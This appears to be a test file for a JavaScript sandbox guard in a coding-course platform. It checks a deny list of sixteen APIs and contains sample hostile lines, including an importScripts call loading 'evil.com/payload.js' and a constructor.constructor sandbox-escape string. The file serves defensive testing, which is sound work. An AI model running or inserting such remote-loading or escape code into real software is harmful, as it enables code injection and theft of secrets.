import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { findForbiddenJs, FORBIDDEN_JS_RULES } from '../src/lib/code/js/jsGuard';
import { COURSES_REGISTRY } from '../src/lib/data/coursesData';

describe('JS/TS forbidden-API guard (CHK-5)', () => {
  it('has all 16 forbidden rules defined', () => {
    assert.strictEqual(FORBIDDEN_JS_RULES.length, 16);
    const names = FORBIDDEN_JS_RULES.map((r) => r.name);
    assert.deepStrictEqual(names, [
      'fetch',
      'XMLHttpRequest',
      'WebSocket',
      'importScripts',
      'eval',
      'new Function',
      'Function(',
      'import(',
      'require(',
      'process.',
      'globalThis',
      'constructor.constructor',
      '__proto__',
      'document.cookie',
      'localStorage',
      'indexedDB',
    ]);
  });

  it('detects each of the 16 forbidden APIs when used', () => {
    const forbiddenSamples: [string, string][] = [
      ['fetch("https://api.example.com")', 'fetch'],
      ['window.fetch("https://api.example.com")', 'fetch'],
      ['const xhr = new XMLHttpRequest();', 'XMLHttpRequest'],
      ['const ws = new WebSocket("wss://echo.websocket.org");', 'WebSocket'],
      ['importScripts("https://evil.com/payload.js")', 'importScripts'],
      ['eval("console.log(1)")', 'eval'],
      ['window.eval("console.log(1)")', 'eval'],
      ['const fn = new Function("return 42");', 'new Function'],
      ['const fn = Function("return 42")();', 'Function('],
      ['import("./secret-module.js")', 'import('],
      ['const fs = require("node:fs");', 'require('],
      ['const key = process.env.API_KEY;', 'process.'],
      ['process["exit"](1);', 'process.'],
      ['const g = globalThis;', 'globalThis'],
      ['const evil = ({}).constructor.constructor("return process")();', 'constructor.constructor'],
      ['const p = Object.__proto__;', '__proto__'],
      ['const c = document.cookie;', 'document.cookie'],
      ['localStorage.setItem("key", "val");', 'localStorage'],
      ['indexedDB.open("appDb", 1);', 'indexedDB'],
    ];

    for (const [code, expectedRule] of forbiddenSamples) {
      const detected = findForbiddenJs(code);
      assert.strictEqual(
        detected,
        expectedRule,
        `Expected "${expectedRule}" to be detected in: ${code}`
      );
    }
  });

  it('does not flag normal identifiers, safe member calls, or string messages', () => {
    const safeSamples = [
      'function fetchUser(id) { return { id }; }',
      'const user = fetchUser("usr_123");',
      'class HttpClient { async fetch(url) { return url; } }',
      'const res = client.fetch("/data");',
      'const isEvaluated = true;',
      'const customProcess = { id: 1 }; customProcess.id = 2;',
      'const myConfig = { env: "prod" }; const val = myConfig.process;',
      'const errorMsg = "The Function failed to execute";',
      'const info = \'Check process.env in deployment\';',
      'const tpl = `User ${userId} fetched successfully`;',
      '// process.exit(0) commented out',
      '/* fetch("https://example.com") inside block comment */',
      'const globalIdentifier = "global";',
    ];

    for (const code of safeSamples) {
      const detected = findForbiddenJs(code);
      assert.strictEqual(
        detected,
        null,
        `Expected safe code but got "${detected}" for: ${code}`
      );
    }
  });

  it('catches malicious execution inside template literal expressions', () => {
    const attack = 'const s = `Result: ${process.exit(1)}`;';
    const detected = findForbiddenJs(attack);
    assert.strictEqual(detected, 'process.');
  });

  it('verifies that every solution in practice_solutions.json passes the guard', () => {
    const solutionsPath = path.resolve(process.cwd(), 'tests/fixtures/practice_solutions.json');
    const solutions = JSON.parse(fs.readFileSync(solutionsPath, 'utf8')) as Record<string, string>;
    const violations: { id: string; detected: string }[] = [];

    for (const [id, code] of Object.entries(solutions)) {
      const detected = findForbiddenJs(code);
      if (detected) {
        violations.push({ id, detected });
      }
    }

    assert.deepStrictEqual(
      violations,
      [],
      `Expected 0 violations in practice_solutions.json but found ${violations.length}`
    );
  });

  it('verifies that all quest test suites pass the guard', () => {
    const violations: { questId: string; detected: string }[] = [];

    for (const course of COURSES_REGISTRY) {
      for (const quest of course.quests || []) {
        if (!quest.testSuite) continue;
        const detected = findForbiddenJs(quest.testSuite);
        if (detected) {
          violations.push({ questId: quest.id, detected });
        }
      }
    }

    assert.deepStrictEqual(
      violations,
      [],
      `Expected 0 violations across quest test suites but found ${violations.length}`
    );
  });
});
